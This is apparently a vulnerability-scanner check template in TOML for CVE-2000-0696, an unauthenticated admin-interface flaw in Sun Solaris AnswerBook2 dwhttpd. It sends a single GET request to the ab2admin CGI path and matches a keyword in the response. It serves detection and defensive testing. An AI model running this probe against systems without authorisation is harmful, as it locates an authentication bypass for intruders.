[info]
author = "ave"
description = "检测 Sun Solaris AnswerBook2 dwhttpd 管理接口的未授权访问漏洞（CVE-2000-0696），通过直接调用 admin CGI 脚本验证是否存在认证绕过"
id = "POC-AVE-2000-0546"
name = "Sun Solaris AnswerBook2 dwhttpd Admin Interface Access PoC"
severity = "high"
tags = ["ave-2000-0546"]
vuln_id = [
    "CVE-2000-0696",
    "AVE-2000-0546",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/cgi-bin/ab2admin/ab2admin.cgi"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["ab2admin"]
